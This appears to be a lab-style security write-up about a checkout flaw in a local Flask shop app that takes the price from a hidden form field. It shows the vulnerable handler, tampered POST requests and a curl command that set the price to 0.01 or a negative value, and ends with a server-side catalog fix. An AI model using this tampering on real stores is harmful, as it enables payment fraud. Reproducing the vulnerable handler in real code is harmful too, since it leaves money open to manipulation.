Client-Controlled Price in a Checkout Flow

The TechStore app shows a catalog with server-side prices, but the "Buy" form ships the price as a hidden field and the backend trusts it. Anyone who can edit the request can pay whatever they want.

Quick reminder

Anything that comes from the browser is attacker-controlled. Form fields, URL parameters, hidden inputs, JSON bodies — a hidden input is only hidden in the rendered page, not in the request. For anything that decides money, permissions, or state, the value must be looked up on the server from a trusted source.

Where the vulnerability comes from

The shop page renders each product with a form that includes the price as a hidden input.

<form method="post" action="/buy">
  <input type="hidden" name="product_name" value="Laptop Pro">
  <input type="hidden" name="price" value="1299.99">
  <button type="submit">Buy Now</button>
</form>

The /buy handler parses the price from the form and deducts it directly from the user's balance.

def buy():
    product_name = request.form['product_name']
    price = float(request.form['price'])

    user = conn.execute("SELECT * FROM users WHERE username=?", (session['username'],)).fetchone()

    if user['balance'] < price:
        return render_template('shop.html', error='Insufficient balance!')

    conn.execute("UPDATE users SET balance = balance - ? WHERE username=?", (price, session['username']))

The product name also comes from the form and is saved to the orders table. That's another integrity issue — the order history doesn't line up with the real catalog — but the money bug is the one that matters.

How the exploit works

Start with a fresh account ($200 balance) and place one normal order so you see what the request looks like. Then replay the request with a modified price.

The normal request

POST /buy
Cookie: session=<your-session>

product_name=Laptop+Pro&price=1299.99

The tampered request

POST /buy
Cookie: session=<your-session>

product_name=Laptop+Pro&price=0.01

Any proxy works — Burp Repeater, the browser devtools "Edit and resend", or plain curl:

curl -X POST http://localhost:5005/buy \
  -H "Cookie: session=<your-session>" \
  -d "product_name=Laptop Pro&price=0.01"

The server deducts 0.01 and writes an order with that price. Visit /orders and the Laptop Pro shows up as paid for one cent.

Going further

A negative price credits the account. price=-500 turns a "purchase" into a deposit, which is usually a clearer finding to demonstrate because the balance increases without any real payment.

Fix

Never take the price from the client. Keep a server-side catalog and look up the price by product id.

PRODUCTS = {
    1: {'name': 'USB Cable', 'price': 9.99},
    4: {'name': 'Gaming Monitor', 'price': 349.99},
    # ...
}

def buy():
    product_id = int(request.form['product_id'])
    product = PRODUCTS.get(product_id)
    if not product:
        return 'Unknown product', 400

    price = product['price']  # trusted value
    name  = product['name']
    # ...then deduct price from the balance...

The form only carries the product id. Everything that determines money is controlled by the server.

The same principle applies to anything sensitive: role, quantity limits, discount percentages, shipping country for tax. If the value decides anything that costs money or grants access, look it up — don't accept it from the client.
